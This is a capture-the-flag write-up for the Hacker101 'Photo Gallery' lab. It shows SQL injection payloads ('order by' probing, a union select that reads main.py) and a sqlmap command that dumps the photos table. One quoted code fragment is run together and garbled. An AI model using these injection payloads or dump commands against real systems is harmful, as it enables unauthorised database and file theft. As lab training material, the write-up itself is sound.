---
title: Photo Gallery
published: true 
tags: Hacker101
---

# Flag 0

### Hints:
* Consider how you might build this system yourself. What would the query for fetch look like?
* Take a few minutes to consider the state of the union
* This application runs on the uwsgi-nginx-flask-docker image

Suspicious is that the last kitten is not visible and used space is 0. I found sql injection error in URL.Going to /fetch?id=1 will return an image, of course the user can manipulate the value of that param. That SQL query return one column because:
```
?id=1 order by 1 # -> return data
?id=1 order by 2 # -> cause error.
```

When I realized that many python apps has main.py I try this:
```
11 union select "main.py"
```
that return main.py file content, and in that file is a hidden flag. There isn't a picture with id 11 so the first query didn't return any data. 

![Flag](assets/photo-gallery/flag0/flag.png)

* * *

# Flag 1

### Hints:
* I never trust a kitten I can't see
* Or a query whose results I can't see, for that matte

When I was looking for flag 0 I identified SQL injection vulnerability. So I decided to dump data from the database. 
```
\n' % sanitize(title) rep += '
' cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, )) fns = [] for pid, ptitle, pfn in cur.fetchall(): rep += '
``` 
That part of the code gives me knowledge about tables where photos are stored. Flag should be somewhere in that table, I guess. Dump data with sqlmap:
```
sqlmap -u http://xxx.xxx.xxx.xxx/xxxxxxxx/fetch?id=1 --dump -T photos --threads 10
```

![Flag](assets/photo-gallery/flag1/flag.png)

As I expect, the flag is in the photos table.